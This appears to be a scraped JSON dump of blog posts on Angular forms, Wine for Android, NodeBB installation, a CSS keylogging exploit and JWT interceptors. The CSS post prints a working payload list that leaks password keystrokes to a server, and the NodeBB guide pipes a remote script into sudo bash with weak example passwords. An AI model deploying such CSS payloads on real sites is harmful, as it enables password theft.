#lastName=\"ngModel\" [(ngModel)]=\"student.lastName\" required&gt;\n &lt;div *ngIf=\"lastName.errors && (lastName.dirty || lastName.touched)\" class=\"alert alert-danger\"&gt;\n &lt;div [hidden]=\"!lastName.errors.required\"&gt;\n Field is required!\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;button type=\"submit\" (click)=\"addStudent()\" [disabled]=\"!myForm.valid\" class=\"btn btn-success text-right\"&gt;Add New Student&lt;/button&gt;\n &lt;/form&gt;/pre\n\nI know it looks like a hot mess, but it&#8217;s not that difficult to understand. To begin with, my form element has the line #myForm=&#8221;ngForm&#8221;. This is necessary to add if you want to use the validators in the component. You will also notice that I provided a name for the form using #form. This is not necessary, but I do it because I like to call the form&#8217;s reset function from the component. In order to do that, I need direct access to the HTML element, so I use that line so that I can set it up as a viewChild. It sounds complicated but it&#8217;s really only one line of code.\n\nNow let&#8217;s talk about the inputs. Each input needs to have its name attribute define. Also, you need to specify a model using #someName = &#8220;ngModel&#8221;. You can look up in the angular docs as to why it is that way, but just know you need that. Also, I am using the line *[(ngModel)]=&#8221;student.firstName&#8221; *to put a two-way bind on the student object and the form input.\n\n{{ ad }}\n\nNow here&#8217;s the cool thing, you can add required and regex validators. I only used required in this form. You will notice that underneath each input element I have a div that shows up only if the input doesn&#8217;t meet the regex requirements or was not filled in. There is this thing called touched or dirty. Essentially, touch is if the user has entered the field. Dirty is if the field is invalid and pretty much the same thing for error.\n\nFinally, the submit button only becomes valid when the form is completely valid. Simple right?\n\nComponent\n\nThere&8217;s really not much to do with the component. So I will show you the relevant parts:\n\npreexport class AppComponent implements OnInit {\n@ViewChild('myForm') myForm:any;\ntitle = 'app';\nstudent: Student;\nstudentArray: Student[];\nconstructor(private toasterService: ToasterService){\n\nthis.student = new Student();\nthis.studentArray = [];\n\n}\n\nngOnInit(){\nlet exampleStudent = new Student();\nexampleStudent.firstName = \"Sarah\";\nexampleStudent.lastName = \"Bucket\";\nexampleStudent.bust = 27;\nexampleStudent.waist = 25;\nexampleStudent.hips = 28;\nexampleStudent.inseam = 20;\nexampleStudent.girth = 43;\nthis.calculateSize(exampleStudent);\nthis.studentArray.push(exampleStudent);\n\n}\n\naddStudent(){\nthis.calculateSize(this.student);\nthis.studentArray.push(this.student);\nthis.student = new Student();\nthis.toasterService.pop('success','Added','New Student Added');\nthis.myForm.reset();\n}/pre\n\nEssentially, I create a new student object. You will also notice the viewChild stuff I mentioned earlier. This is so I can call the *form.reset() *functionality which will reset the form (and reset all dirty/touched parameters for all the inputs).\n\n&nbsp;\n",
        "tags": [
            "angular 4",
            "forms"
        ]
    },
    {
        "uri": "/angular-4-forms/",
        "title": "Angular 4 Forms",
        "content": "\nOne of my favorite features in Angular are forms. Using Angular 4 forms or Angular 5 forms are very helpful because they provide for quick validation and object mapping. Here&#8217;s how you can create a basic angular 4 form (also works with angular 2, and angular 5).\n\nHTML\n\nYou will also notice that I am using Bootstrap for some styling, that is completely optional. Let&8217;s look at the form HTML:\n\npre&lt;form #myForm=\"ngForm\" #form class=\" animated fadeIn\"&gt;\n &lt;div class=\"form-group\"&gt;\n &lt;label for=\"exampleInputEmail1\"&gt;First Name&lt;/label&gt;\n &lt;input type=\"email\" class=\"form-control\" aria-describedby=\"emailHelp\" name=\"firstName\" [(ngModel)]=\"student.firstName\" #firstName=\"ngModel\" required &gt;\n &lt;!-- &lt;small id=\"emailHelp\" class=\"form-text text-muted\"&gt;We'll never share your email with anyone else.&lt;/small&gt; --&gt;\n &lt;div *ngIf=\"firstName.errors && (firstName.dirty || firstName.touched)\" class=\"alert alert-danger\"&gt;\n &lt;div [hidden]=\"!firstName.errors.required\"&gt;\n Field is required!\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;div class=\"form-group\"&gt;\n &lt;label for=\"exampleInputPassword1\"&gt;Last Name&lt;/label&gt;\n &lt;input type=\"text\" class=\"form-control\" name=\"lastName\" #lastName=\"ngModel\" [(ngModel)]=\"student.lastName\" required&gt;\n &lt;div *ngIf=\"lastName.errors && (lastName.dirty || lastName.touched)\" class=\"alert alert-danger\"&gt;\n &lt;div [hidden]=\"!lastName.errors.required\"&gt;\n Field is required!\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;button type=\"submit\" (click)=\"addStudent()\" [disabled]=\"!myForm.valid\" class=\"btn btn-success text-right\"&gt;Add New Student&lt;/button&gt;\n &lt;/form&gt;/pre\n\nI know it looks like a hot mess, but it&#8217;s not that difficult to understand. To begin with, my form element has the line #myForm=&#8221;ngForm&#8221;. This is necessary to add if you want to use the validators in the component. You will also notice that I provided a name for the form using #form. This is not necessary, but I do it because I like to call the form&#8217;s reset function from the component. In order to do that, I need direct access to the HTML element, so I use that line so that I can set it up as a viewChild. It sounds complicated but it&#8217;s really only one line of code.\n\nNow let&#8217;s talk about the inputs. Each input needs to have its name attribute define. Also, you need to specify a model using #someName = &#8220;ngModel&#8221;. You can look up in the angular docs as to why it is that way, but just know you need that. Also, I am using the line *[(ngModel)]=&#8221;student.firstName&#8221; *to put a two-way bind on the student object and the form input.\n\n{{ ad }}\n\nNow here&#8217;s the cool thing, you can add required and regex validators. I only used required in this form. You will notice that underneath each input element I have a div that shows up only if the input doesn&#8217;t meet the regex requirements or was not filled in. There is this thing called touched or dirty. Essentially, touch is if the user has entered the field. Dirty is if the field is invalid and pretty much the same thing for error.\n\nFinally, the submit button only becomes valid when the form is completely valid. Simple right?\n\nComponent\n\nThere&8217;s really not much to do with the component. So I will show you the relevant parts:\n\npreexport class AppComponent implements OnInit {\n@ViewChild('myForm') myForm:any;\ntitle = 'app';\nstudent: Student;\nstudentArray: Student[];\nconstructor(private toasterService: ToasterService){\n\nthis.student = new Student();\nthis.studentArray = [];\n\n}\n\nngOnInit(){\nlet exampleStudent = new Student();\nexampleStudent.firstName = \"Sarah\";\nexampleStudent.lastName = \"Bucket\";\nexampleStudent.bust = 27;\nexampleStudent.waist = 25;\nexampleStudent.hips = 28;\nexampleStudent.inseam = 20;\nexampleStudent.girth = 43;\nthis.calculateSize(exampleStudent);\nthis.studentArray.push(exampleStudent);\n\n}\n\naddStudent(){\nthis.calculateSize(this.student);\nthis.studentArray.push(this.student);\nthis.student = new Student();\nthis.toasterService.pop('success','Added','New Student Added');\nthis.myForm.reset();\n}/pre\n\nEssentially, I create a new student object. You will also notice the viewChild stuff I mentioned earlier. This is so I can call the *form.reset() *functionality which will reset the form (and reset all dirty/touched parameters for all the inputs).\n\n&nbsp;\n",
        "tags": [
            "angular 4",
            "forms"
        ]
    },
    {
        "uri": "/run-windows-applications-exe-files-on-android/",
        "title": "Run Windows Applications (EXE Files) on Android",
        "content": "If I had a dollar for the number of times someone asked how to run Windows Exe Files on Android, I would be richer than your top Bitcoin miners. Most of the time, my response would have simply been that it&#8217;s not possible, end of story. Well, that sort of changed this week.\n\nIf you are a Linux user, you have probably heard of Wine. The tl;dr is that Wine allows you to run Windows apps in Linux (it&#8217;s a Windows compatibility layer). There are obviously more technical details of its approach that you can read further about later, but that&#8217;s the general idea of the framework. Recently, Wine has released an android app that allows for this same Windows emulation on your Android device. So with Wine 3.0, you can run Windows Applications (Exe Files) on Android.\n\nDownloads:\n\n   a href=\"https://dl.winehq.org/wine-builds/android/\" target=\"_blank\" rel=\"noopener\"Wine for Android/a\n\nYou are likely using an ARM powered device, therefore, you are going to need to download the wine-3-arm.apk. Because you are using the ARM version, you will only be able to use Windows app designed for ARM. That restricts you to mainly Windows RT apps, however, XDA developers does have a href=\"https://forum.xda-developers.com/showthread.php?t=2092348\" target=\"_blank\" rel=\"noopener\"a nice list/a of apps re-compiled to ARM that you can try.\n\nWhen you launch the Wine for Android, you will be at a desktop screen that looks a little like Windows.\n\n{{ ad }}\n\nRight now, you can&#8217;t resize any of the windows so you are stuck at their default size. This can get a little annoying when you have to deal with apps that are sized very small by default. In the start menu, you have an option for control panel and run. When you click on run, you can browse your phone&#8217;s storage for a Windows EXE file to run.\n\nIn my testing, I tried a couple of apps like Notepad++ and another simple Notepad editor. Neither of them worked, and one of them required Visual C++ for ARM to be installed. Although I was able to find the installer and run it, it ultimately failed to finish. In the end, I think Wine for Android is a cool thing that allows you to run Windows applications on Android, but it&#8217;s not ready for everyday use just yet. Still, it&#8217;s an amazing project and could be completely usable at some point in the future.\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2018/01/Part-1.000140_01.Still004.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2018/01/Part-1.000151_20.Still005.jpg\n",
        "tags": [
            "android",
            "windows",
            "wine"
        ]
    },
    {
        "uri": "/how-to-build-a-forum/",
        "title": "How to build a forum",
        "content": "\nPractically every online community has a forum. It makes sense though because forums are a great way to facilitate online discussion. Now let&#8217;s say that you wanted to build your own online forum. Well, building a very basic forum wouldn&#8217;t be too complicated. Just script together some PHP with an MYSQL database and you will be all set. Unfortunately, this would likely leave you vulnerable to many potential security holes and a terrible user experience. Plus, you would have to code a whole lot of extra functionality just to match the expectations of today&#8217;s modern forums.\n\nSo do yourself a favor and don&#8217;t reinvent the wheel unless you just want a good programming exercise. There are many good open source projects that can serve as a boilerplate for your forum. In this article, we will take a look at using a href=\"https://github.com/NodeBB/NodeBB\" target=\"_blank\" rel=\"noopener\"NodeBB/a in order to build your own forum. It is built using NodeJS and MongoDB. So let&#8217;s take a look at how to build a forum.\n\nRequirements:\n\nLinux (Preferably Ubuntu)\nNodeJS\nMongoDB\n\n Step 1: Installing NodeJS\n\nLet&#8217;s start with installing the latest version of NodeJS. To do this, you will need to do the following:\n\nprecurl -sL https://deb.nodesource.com/setup_8.x | sudo -E bash -\nsudo apt-get install -y nodejs/pre\n\nThis will install NodeJS version 8 to your system.\n\nStep 2: Installing MongoDB\n\nTo install MongoDB on Ubuntu, you can follow the instructions on their website or use the instructions below if you are running Ubuntu 16.04.\n\npreecho \"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-3.6.list/pre\n\npresudo apt-get update/pre\n\npresudo apt-get install -y mongodb-org/pre\n\nYou also need to make a data directory for MongoDB. By default it&8217;s at /data/db\n\npresudo mkdir /data\n\nsudo mkdir /data/db/pre\n\nFinally, you can start the service:\n\npresudo service mongod start/pre\n\nStep 3: Configuring MongoDB\n\nYou will need to set up an admin account in MongoDB.\n\n{{ ad }}\n\nEnter mongo by typing in the following:\n\npremongo/pre\n\nThen switch to the admin database (it will automatically create it for you)\n\npreuse admin/pre\n\nThen type in the following:\n\npredb.createUser({user: \"dave\",pwd: \"1234\",roles: [ { role: \"userAdminAnyDatabase\", db: \"admin\" } ]})/pre\n\nNext, we need to create a table for NodeBB. Switch to the NodeBB table:\n\npreuse nodebb/pre\n\nThen type in the following to set up an admin in this table. You must keep the user ad nodebb:\n\npredb.createUser({ user: \"nodebb\", pwd: \"abcd\", roles: [ { role: \"readWrite\", db: \"nodebb\" },{ role: \"clusterMonitor\", db: \"admin\"}]})/pre\n\nFinally, type in:\n\nprequit()/pre\n\n Step 4:  Securing MongoDB\n\nAlthough we configured ad admin user, we have yet to enable a secure sign on for MongoDB. This can be easily configured by editing the mongod.conf file and appending the following:\n\npresudo nano etc/mongod.conf/pre\n\nAdd tfollowinging line:\n\npresecurity:\n   authorization: \"enabled\"/pre\n\nThen hit CRTL + O to save and CRTL + X to exit. Finally, restart MongoDB:\n\npresudo service mongod restart/pre\n\nYou should be able to sign in to Mongo now using your username and password:\n\npremongo -u yourusername -p yourpassword --authenticationDatabase=admin/pre\n\nStep 5: Install NodeBB\n\nIt&8217;s finally time to install MongoDB.\n\n{{ ad }}\n\nFirst, make sure you have git installed along with the build-essential tools:\n\npresudo apt-get install -y git build-essential/pre\n\nGo into any directory that you want and clone the repo:\n\npregit clone -b v1.5.x https://github.com/NodeBB/NodeBB.git $HOME/nodebb/pre\n\nNow type in the following:\n\nprecd nodebb\n\nnpm install --production/pre\n\npre./nodebb setup/pre\n\nThis will begin installing the required components. Once it&#8217;s done you can start the service:\n\npre/.nodebb start/pre\n\nTo stop the service you can type in the following:\n\npre./nodebb stop/pre\n\nBy default, it is running on port 4567. So to access your new forum you can go to http://localhost:4567.\n\nThat&#8217;s it! You will now be in your working forum that gives you lots of customizability along with admin controls and user registration.\n\nFurther Considerations\n\nIt might be a good idea to put the server behind Nginx or Apache. That way you can do things like enable SSL. I am not going to cover it here, but the general idea isn&8217;t too hard. Simple forward an apache or Nginx port to the locally running port on your computer.\n\n&nbsp;\n",
        "tags": [
            "forum",
            "linux",
            "server",
            "ubuntu"
        ]
    },
    {
        "uri": "/simple-css-hack-can-steal-internet-passwords/",
        "title": "Simple CSS Hack Can Steal Internet Passwords",
        "content": "\nA user on GitHub just a href=\"https://github.com/maxchehab/CSS-Keylogging\" target=\"_blank\" rel=\"noopener\"posted an alarming exploit/a shows how a simple CSS hack can steal internet passwords. It&#8217;s kinda funny how you wouldn&#8217;t really think of CSS when it comes to vulnerabilities and hacking. Since CSS is only used to style a webpage, its threat level is generally considered to be relatively low.\n\nHowever, CSS does provide developers with very advanced selectors. In this case, if you wanted to select an input with the value of A in it and turn it red, then CSS allows you to do that.  Now combine that with CSS&#8217;s background-img URL property that allows you to create a GET request for some background image. But instead of grabbing an image, you post to a server.\n\nSo here&#8217;s what all of this looks like:\n\nprespan class=\"pl-ent\"input/spanspan class=\"pl-e\"type/spanspan class=\"pl-k\"=/spanspan class=\"pl-s\"span class=\"pl-pds\"\"/spanpasswordspan class=\"pl-pds\"\"/span/span {\n  span class=\"pl-c1\"background-image/span: span class=\"pl-c1\"url/span(span class=\"pl-s\"span class=\"pl-pds\"\"/spanhttp://localhost:3000/aspan class=\"pl-pds\"\"/span/span);\n}/pre\n\nWhat this selector is doing, is that it&#8217;s looking for any input of type password and value that ends with a. So you&#8217;re probably thinking, okay what&#8217;s the big deal? You&#8217;re only able to get the last value of an input field and not the whole password. And you are absolutely right until you consider doing something like GitHub user maxchehab:\n\npreinputtype=\"password\" { background-image: url(\"http://localhost:3000/+\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%21\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%22\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%23\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%24\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%25\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%26\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%27\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%28\"); }\ninputtype=\"password\"\"] { background-image: url(\"http://localhost:3000/%29\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%2A\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%2B\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%2C\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/-\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/.\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%2F\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/0\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/1\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/2\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/3\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/4\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/5\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/6\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/7\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/8\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/9\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%3A\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%3B\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%3C\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%3D\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%3E\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%3F\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%40\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/A\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/B\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/C\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/D\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/E\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/F\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/G\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/H\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/I\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/J\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/K\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/L\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/M\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/N\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/O\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/P\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/Q\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/R\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/S\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/T\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/U\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/V\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/W\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/X\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/Y\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/Z\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%5B\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%5C\"); }\ninputtype=\"password\"\"] { background-image: url(\"http://localhost:3000/%5D\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%5E\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/_\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%60\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/a\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/b\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/c\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/d\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/e\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/f\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/g\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/h\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/i\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/j\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/k\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/l\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/m\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/n\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/o\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/p\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/q\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/r\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/s\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/t\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/u\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/v\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/w\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/x\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/y\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/z\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%7B\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%7C\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%7D\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/~\"); }\ninputtype=\"password\" { background-image: url(\"http://localhost:3000/%7F\"); }/pre\n\nNow, this is detecting every key-stroke and sending it to the server!\n\n{{ ad }}\n\nOkay, let&#8217;s settle down the fear-mongering for a second and point out one small thing. This is only a vulnerability for input fields that update the value field with the user&#8217;s value. Most of the time, this isn&#8217;t an issue&#8230;except if you&#8217;re using ReactJS.\n\nIn fact, it&#8217;s recommended in ReactJS that you only update the input field using this method. And unfortunately, lots of sites do use ReactJS. However, the fix for this could simply be a browser requests that could restrict CSS access from certain types of fields like password inputs.\n",
        "tags": [
            "css",
            "exploits"
        ]
    },
    {
        "uri": "/implementing-token-interceptor-and-retry-in-angular-4-2/",
        "title": "Implementing Token Interceptor and Retry in Angular 4",
        "content": "\nIf you are building a web application using Angular 4 or Angular 5 there&#8217;s a good chance that you might be working with JWT tokens. Luckily, implementing token interceptor and retry in Angular 4 and beyond is very easy thanks to the new HTTP Interceptors. Using this, we can add an authorization header to every outbound request while also implementing a retry mechanism for requests that fail due to an expired token. Let&#8217;s walk through the code.\n\nApp Module\n\nThe first thing that you need to do is implement the interceptors in the App module.\n\npre id=\"7322\"providers: [\n    {\n      provide: HTTP_INTERCEPTORS,\n      useClass: TokenInterceptor,\n      multi: true\n    }\n  ]/pre\n\nNote that the useclass property will be the imported class that uses your TokenInterceptor.\n\n Auth Service\n\nWe are going to first create a service that&#8217;s going to be responsible for retrieving our JWT access token and JWT refresh token. Note that we are making use of the a href=\"https://github.com/auth0/angular2-jwt\" target=\"_blank\" rel=\"noopener\"angular JWT library./a\n\npreimport { tokenNotExpired, JwtHelper } from 'angular2-jwt';\n\n@Injectable()\n\nexport class AuthService {\n\njwtHelper: JwtHelper = new JwtHelper();\n\nconstructor(private http: HttpClient) {\n\n}\n\npublic getToken(): string {\n\nreturn localStorage.getItem('access_token');\n\n}\n\npublic getRefreshToken(): string {\n\nreturn localStorage.getItem('refresh_token');\n\n}\n\npublic getNewAcessToken() {\n\nreturn this.http.post(this.uatUrl, { 'RefreshToken': this.getRefreshToken() });\n\n}\n\n/pre\n\nToken Interceptor Class\n\nNow let&8217;s write the token interceptor class.\n\n{{ ad }}\n\npreimport { Injectable, Inject, Injector } from '@angular/core';\n\nimport { HttpRequest, HttpHandler, HttpEvent, HttpInterceptor, HttpResponse, HttpErrorResponse } from '@angular/common/http';\n\nimport { AuthService } from './auth.service';\n\nimport { LoaderService } from './loader.service';\n\nimport 'rxjs/add/operator/do';\n\nimport 'rxjs/add/operator/catch';\n\nimport { Observable } from 'rxjs/Observable';\n\nimport { Router } from '@angular/router';\n\n@Injectable()\n\nexport class TokenInterceptor implements HttpInterceptor {\n\n  public cachedRequests: Array = [];\n\n  constructor(private router: Router, public inj: Injector, public loaderInject: Injector) { }\n\n  private applyCredentials = (req: HttpRequest, token: string) =&gt; {\n    return req.clone({\n      setHeaders: {\n\n        Authorization: token\n\n      }\n    });\n  }\n\n  intercept(req: HttpRequest, next: HttpHandler): Observable&lt;HttpEvent&gt; {\n\n    const auth = this.inj.get(AuthService);\n\n    const authReq = this.applyCredentials(req, auth.getToken());\n\n    return next.handle(authReq)\n\n      .map((event: HttpEvent) =&gt; {\n\n        if (event instanceof HttpResponse) {\n\n          return event;\n\n        }\n\n      })\n\n      .catch((error: any) =&gt; {\n\n        if (error instanceof HttpErrorResponse) {\n\n          if (error.status === 401) {\n\n            console.log('Unauthorized');\n\n            return auth\n\n              .getNewAcessToken()\n\n              .flatMap((res) =&gt; {\n\n                localStorage.setItem('access_token', (res as any).Token);\n\n                return next.handle(this.applyCredentials(req, auth.getToken()));\n\n              });\n\n          } else if (error.status === 403) { //log back in!!\n\n            this.router.navigate(['/login']);\n\n          }\n\n        } else {\n\n          return Observable.throw(error);\n\n        }\n\n      });\n\n  }\n\n}\n/pre\n\nHere&#8217;s the flow: Upon every request, the token interceptor is calling the apply credentials functions which appending an authorization header to every request. This header contains the access token. If a request fails with a 401, we can assume that the token has expired. Therefore, we are grabbing a fresh token from our auth service and retrying the failed request with the new token. If we get a 403, then we can assume that the access token failed and the user needs to log back in.\n",
        "tags": [
            "angular",
            "http interceptor",
            "jwt"
        ]
    },
    {
        "uri": "/implementing-token-interceptor-and-retry-in-angular-4/",
        "title": "Implementing Token Interceptor and Retry in Angular 4",
        "content": "\nIf you are building a web application using Angular 4 or Angular 5 there&#8217;s a good chance that you might be working with JWT tokens. Luckily, implementing token interceptor and retry in Angular 4 and beyond is very easy thanks to the new HTTP Interceptors. Using this, we can add an authorization header to every outbound request while also implementing a retry mechanism for requests that fail due to an expired token. Let&#8217;s walk through the code.\n\nApp Module\n\nThe first thing that you need to do is implement the interceptors in the App module.\n\npre id=\"7322\"providers: [\n    {\n      provide: HTTP_INTERCEPTORS,\n      useClass: TokenInterceptor,\n      multi: true\n    }\n  ]/pre\n\nNote that the useclass property will be the imported class that uses your TokenInterceptor.\n\n Auth Service\n\nWe are going to first create a service that&#8217;s going to be responsible for retrieving our JWT access token and JWT refresh token. Note that we are making use of the a href=\"https://github.com/auth0/angular2-jwt\" target=\"_blank\" rel=\"noopener\"angular JWT library./a\n\npreimport { tokenNotExpired, JwtHelper } from 'angular2-jwt';\n\n@Injectable()\n\nexport class AuthService {\n\njwtHelper: JwtHelper = new JwtHelper();\n\nconstructor(private http: HttpClient) {\n\n}\n\npublic getToken(): string {\n\nreturn localStorage.getItem('access_token');\n\n}\n\npublic getRefreshToken(): string {\n\nreturn localStorage.getItem('refresh_token');\n\n}\n\npublic getNewAcessToken() {\n\nreturn this.http.post(this.uatUrl, { 'RefreshToken': this.getRefreshToken() });\n\n}\n\n/pre\n\nToken Interceptor Class\n\nNow let&8217;s write the token interceptor class.\n\n{{ ad }}\n\npreimport { Injectable, Inject, Injector } from '@angular/core';\n\nimport { HttpRequest, HttpHandler, HttpEvent, HttpInterceptor, HttpResponse, HttpErrorResponse } from '@angular/common/http';\n\nimport { AuthService } from './auth.service';\n\nimport { LoaderService } from './loader.service';\n\nimport 'rxjs/add/operator/do';\n\nimport 'rxjs/add/operator/catch';\n\nimport { Observable } from 'rxjs/Observable';\n\nimport { Router } from '@angular/router';\n\n@Injectable()\n\nexport class TokenInterceptor implements HttpInterceptor {\n\n  public cachedRequests: Array = [];\n\n  constructor(private router: Router, public inj: Injector, public loaderInject: Injector) { }\n\n  private applyCredentials = (req: HttpRequest, token: string) =&gt; {\n    return req.clone({\n      setHeaders: {\n\n        Authorization: token\n\n      }\n    });\n  }\n\n  intercept(req: HttpRequest, next: HttpHandler): Observable&lt;HttpEvent&gt; {\n\n    const auth = this.inj.get(AuthService);\n\n    const authReq = this.applyCredentials(req, auth.getToken());\n\n    return next.handle(authReq)\n\n      .map((event: HttpEvent) =&gt; {\n\n        if (event instanceof HttpResponse) {\n\n          return event;\n\n        }\n\n      })\n\n      .catch((error: any) =&gt; {\n\n        if (error instanceof HttpErrorResponse) {\n\n          if (error.status === 401) {\n\n            console.log('Unauthorized');\n\n            return auth\n\n              .getNewAcessToken()\n\n              .flatMap((res) =&gt; {\n\n                localStorage.setItem('access_token', (res as any).Token);\n\n                return next.handle(this.applyCredentials(req, auth.getToken()));\n\n              });\n\n          } else if (error.status === 403) { //log back in!!\n\n            this.router.navigate(['/login']);\n\n          }\n\n        } else {\n\n          return Observable.throw(error);\n\n        }\n\n      });\n\n  }\n\n}\n/pre\n\nHere&#8217;s the flow: Upon every request, the token interceptor is calling the apply credentials functions which appending an authorization header to every request. This header contains the access token. If a request fails with a 401, we can assume that the token has expired. Therefore, we are grabbing a fresh token from our auth service and retrying the failed request with the new token. If we get a 403, then we can assume that the access token failed and the user needs to log back in.\n",
        "tags": [
            "angular",
            "http interceptor",
            "jwt"
        ]
    },
    {
        "uri": "/angular-4-input-numbers-directive/",
        "title": "Angular 4 input only numbers Directive",
        "content": "\nI was working on a project in Angular 4 and needed to implement input fields that only accept numerical values. My first thought was to simply add the HTML5 type=&#8221;number&#8221; to the input. Unfortunately, this isn&#8217;t supported in Internet Explorer 10 and some of the clients would most likely be using Internet Explorer 10. My only other option was to implement a directive. Thanks to this a href=\"https://stackoverflow.com/questions/41465542/angular2-input-field-to-accept-only-numbers\" target=\"_blank\" rel=\"noopener\"StackOverflow answer/a, I was able to modify it to my needs.\n\nNumber Directive:\n\nBegin by creating a separate file called number.directive.ts. Put the following in that file:\n\npreimport { Directive, ElementRef, HostListener } from '@angular/core';\n\n@Directive({\n selector: '[myNumberOnly]'\n})\nexport class NumberOnlyDirective {\n // Allow decimal numbers and negative values\n private regex: RegExp = new RegExp(/^-?[0-9]+(\\.[0-9]*){0,1}$/g);\n // Allow key codes for special events. Reflect :\n // Backspace, tab, end, home\n private specialKeys: Array&lt;string&gt; = [ 'Backspace', 'Tab', 'End', 'Home', '-' ];\n\nconstructor(private el: ElementRef) {\n }\n @HostListener('keydown', [ '$event' ])\n onKeyDown(event: KeyboardEvent) {\n // Allow Backspace, tab, end, and home keys\n if 